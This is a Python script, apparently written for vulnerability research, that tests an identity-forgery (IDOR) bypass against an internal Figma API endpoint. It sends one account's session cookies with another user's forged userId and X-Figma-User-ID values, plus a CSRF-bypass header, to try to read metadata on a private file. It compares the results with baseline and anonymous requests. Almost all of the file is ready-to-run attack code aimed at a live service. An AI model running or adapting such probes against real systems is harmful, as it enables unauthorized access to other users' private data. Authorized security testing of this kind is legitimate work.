# -*- coding: utf-8 -*-
"""file_custom_tool_ids HTTP resolver 直连: userId query 参数伪造测试
目标: B 传 userId=A_UID 能否读到 A 私有文件的自定义工具引用元数据
对照: A 自己 / B 自己 / 匿名 / 公开文件
"""
import sys, io, json, uuid, urllib.request, urllib.parse, urllib.error
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

BASE = "https://www.figma.com"
A_PRIV = "5Gs4PaTz11Hlk2sqVnidBG"   # A 私有文件
PUBLIC = "bv2nMIdFf4u3dESGail4sm"   # 公开对照
A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
FAKE = str(uuid.uuid4())
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
AC = io.open('ws_cookie_A_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')
BC = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')

REAL_HDRS = {
    "accept": "application/json",
    "origin": "https://www.figma.com",
    "referer": "https://www.figma.com/files/recent?fuid=" + A_UID,
    "x-csrf-bypass": "yes",
    "x-figma-client-version": "2b21e65a5f4c6eeec607f7f2fef85a543e1e7410",
    "x-figma-support-request-id": "srid_MPMYZJ8TAHXQHDK6TF1DVS37Y",
    "x-figma-user-plan-max": "starter",
    "tsid": "898Au7HDiKZ4wBuy",
    "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
}

def call(label, cookie, userId, file_key, tool_id, extra=None, rid=None):
    params = {"userId": userId, "file_key": file_key, "tool_ids": tool_id}
    if rid:
        params["__requestId"] = rid
    qs = urllib.parse.urlencode(params)
    hdrs = {"User-Agent": UA, "Accept": "application/json",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/",
            "Cookie": cookie, "X-Figma-User-ID": userId}
    hdrs.update(REAL_HDRS)
    if extra:
        hdrs.update(extra)
    req = urllib.request.Request(
        f"{BASE}/api/internal/livegraph/sinatra_resolver/file_custom_tool_ids?{qs}",
        headers=hdrs)
    try:
        r = urllib.request.urlopen(req, timeout=20)
        raw = r.read().decode(errors='replace')
        print(f"[{label}] {r.status} len={len(raw)} :: {raw[:300]}")
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] {e.code} :: {raw[:300]}")
    except Exception as e:
        print(f"[{label}] !! {type(e).__name__} {str(e)[:80]}")

RID = str(uuid.uuid4())
print(f"使用 __requestId={RID[:8]}...")

print("===== 1. 基线: A→A 私有文件 (带 __requestId) =====")
call("A→A 私有", AC, A_UID, A_PRIV, FAKE, rid=RID)
call("A→A 公开", AC, A_UID, PUBLIC, FAKE, rid=RID)

print("\n===== 2. B→A 私有 (userId=B, 真实身份) =====")
call("B→A 私有 B_UID", BC, B_UID, A_PRIV, FAKE, rid=RID)
call("B→公开 B_UID", BC, B_UID, PUBLIC, FAKE, rid=RID)

print("\n===== 3. 核心: B cookie + userId=A_UID (伪造) =====")
call("B→A 私有 伪A_UID", BC, A_UID, A_PRIV, FAKE, rid=RID)
call("B→公开 伪A_UID", BC, A_UID, PUBLIC, FAKE, rid=RID)

print("\n===== 4. 匿名 + userId=A_UID =====")
call("匿名→A 私有 A_UID", "", A_UID, A_PRIV, FAKE, rid=RID)
call("匿名→公开 A_UID", "", A_UID, PUBLIC, FAKE, rid=RID)
